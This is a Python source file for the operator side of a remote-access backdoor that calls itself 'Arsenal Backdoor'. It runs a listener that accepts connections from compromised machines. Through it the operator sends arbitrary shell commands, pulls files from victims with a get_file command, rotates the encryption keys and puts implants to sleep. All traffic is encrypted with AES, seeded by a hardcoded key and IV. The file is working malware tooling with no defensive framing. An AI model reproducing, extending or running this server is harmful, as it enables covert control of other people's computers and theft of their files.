#!/usr/bin/python3
import socket, sys, os, argparse, subprocess, struct, string, random, time, gzip
from _thread import start_new_thread
from Crypto.Cipher import AES
parser = argparse.ArgumentParser(description='q*bert says goodbye')
parser.add_argument('-p', dest='port', help='Hosting port', required=True, type=int)
parser.add_argument('-s', dest='host', help='Hosting IP')
args = parser.parse_args()
aeskey = 'This is a key123'
aesiv = 'This is an IV456'

if args.host is None:
    args.host = '0.0.0.0'

def update_aeskeys():
    global aeskey
    global aesiv
    tmpkey = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(32))
    tmpiv = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
    tmp = do_encrypt(bytes('aeskey '+ tmpkey + ' '+ tmpiv, 'utf-8'))
    aeskey = tmpkey
    aesiv = tmpiv
    return tmp

def do_encrypt(message):
    if isinstance(message, bytes):
        pass
    else:
        message = bytes(message, 'utf-8')
    length = 16 - (len(message) % 16)
    message += bytes([length])*length
    obj = AES.new(aeskey, AES.MODE_CBC, aesiv)
    cipher = obj.encrypt(message)
    return cipher

def do_decrypt(ciphertext):
    obj2 = AES.new(aeskey, AES.MODE_CBC, aesiv)
    message = obj2.decrypt(ciphertext)
    return message[:-message[-1]]

def get_data(conn, buff):
    bs = conn.recv(8)
    try:
        (length,) = struct.unpack('>Q', bs)
    except struct.error as err:
        print("{0}".format(err))
        return 0
    data = b''
    while len(data) < length:
        to_read = length - len(data)
        data += conn.recv(buff if to_read > buff else to_read)
    return data

def sendit(conn, message):
    length = struct.pack('>Q', len(message))
    conn.sendall(length)
    conn.sendall(message)

def client(conn, addr, buff):
    reply = ''
    sendit(conn, do_encrypt('Arsenal Backdoor'))
    while True:
        data = get_data(conn, buff)
        if 'get_file' in reply:
            with open(reply.split(' ')[2], 'wb+') as f:
                f.write(do_decrypt(data))
        elif 'Updated' in str(do_decrypt(data).strip(), 'utf-8'):
            print(str(do_decrypt(data).strip()))
            sys.exit()
        elif data == 0:
            break
        else:
            print(str(do_decrypt(data).strip(), 'utf-8'))
        while True:
            try:
                reply=input('Enter command for %s: ' %addr[0])
            except ValueError:
                print("Bad input")
            if reply == 'help':
                print('update_key\nget_file /path/to/file')
            elif reply == "update_key":
                sendit(conn, update_aeskeys())
                break
            elif 'get_file' in reply:
                sendit(conn, do_encrypt(reply))
                break
            elif reply.strip() == 'Arsenal Backdoor':
                continue
            else:
                sendit(conn, do_encrypt('cmd ' + reply))
                break
        if not data:
            break
    conn.close()
    print("\nClosed connection from %s:%s" %(addr[0],addr[1]))
    if 'sleep' in reply:
        sleepy = int(reply.split(' ')[1])
        for i in range(sleepy, 0, -1):
            sys.stdout.write("\r{0} sleeping for {1}       ".format(addr[0], i))
            time.sleep(1)
def main():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    buff = 4096
    s.bind((args.host, args.port))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        os.system('clear')
        print("\nConnection received from %s:%s" %(addr[0], addr[1]))
        try:
            start_new_thread(client, (conn, addr, buff))
        except socket.error:
            sys.stderr.write("[Error] %s\n" %socket.error.msg[1])
        except KeyboardInterrupt:
            print('[-] Server shutting down...')
            break

def draw_screen():
    global menu
    os.system('clear')
    print(menu)


if __name__ == '__main__':
    main()
